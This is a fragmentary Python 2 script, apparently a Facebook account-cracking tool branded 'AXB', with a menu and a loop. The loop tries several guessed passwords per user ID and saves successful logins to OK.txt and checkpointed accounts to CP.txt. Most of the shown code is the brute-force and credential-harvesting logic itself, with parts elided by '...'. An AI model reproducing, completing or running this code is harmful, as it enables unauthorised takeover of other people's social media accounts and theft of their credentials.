...
def log_menu():
    try:
        ...
        os.system('clear')
        print logo
        print '\x1b[1;93m ~~~~ AXB MENU~~~~\x1b[1;91m'
        print 47 * '-'
...
def crack():
    ...
    print '\x1b[1;92m[2] ip to content'
...
def c_s():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[SUCCESSFUL] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[CHECKPOINT] ' + uid + ' | ' + pass1
                cp = open('CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[SUCCESSFUL] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[AXB-CHECKPOINT] ' + uid + ' | ' + pass2
                    cp = open('CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[AXB-SUCCESSFUL] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
